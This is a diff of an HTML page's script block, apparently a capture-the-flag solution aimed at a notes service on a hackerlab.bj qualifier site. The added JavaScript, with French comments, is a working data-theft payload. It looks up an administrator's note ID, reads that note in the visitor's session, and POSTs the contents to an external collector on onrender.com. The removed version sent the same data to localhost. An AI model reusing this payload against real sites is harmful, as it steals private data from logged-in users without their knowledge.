@@ -7,19 +7,36 @@
 </head>
 <body>
     <script>
-        fetch('https://notes.qualif.hackerlab.bj/api.php')
-        .then(response => response.json())
-        .then(data => {
-            const id = data.id
-            fetch('https://notes.qualif.hackerlab.bj/note.php?id=' + id)
-            .then(response => {
-                fetch('http://localhost:8080/chocolate', {
-                    method: 'POST',
-                    body : JSON.stringify({ chocolate : response})
-                })
-                .then(response => console.log(response))
-            })
-        })
-    </script>
+        // Fonction pour exfiltrer les données
+        function exfiltrateData(data) {
+          var xhr = new XMLHttpRequest();
+          xhr.open("POST", "https://chocolate-7q8m.onrender.com/chocolate", true);
+          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+          xhr.send("chocolate=" + encodeURIComponent(data));
+        }
+      
+        // Requête pour obtenir l'ID de l'administrateur
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://notes.qualif.hackerlab.bj/api.php", true);
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState == 4 && xhr.status == 200) {
+            var response = JSON.parse(xhr.responseText);
+            var adminId = response.id; // Supposons que l'ID de l'admin est dans la clé "admin_id"
+            
+            // Requête pour obtenir le contenu de la note en utilisant l'ID de l'admin
+            var noteXhr = new XMLHttpRequest();
+            noteXhr.open("GET", "https://notes.qualif.hackerlab.bj/note.php?id=" + adminId, true);
+            noteXhr.onreadystatechange = function() {
+              if (noteXhr.readyState == 4 && noteXhr.status == 200) {
+                var noteContent = noteXhr.responseText;
+                exfiltrateData(noteContent);
+              }
+            };
+            noteXhr.send();
+          }
+        };
+        xhr.send();
+        
+        </script>      
 </body>
 </html>
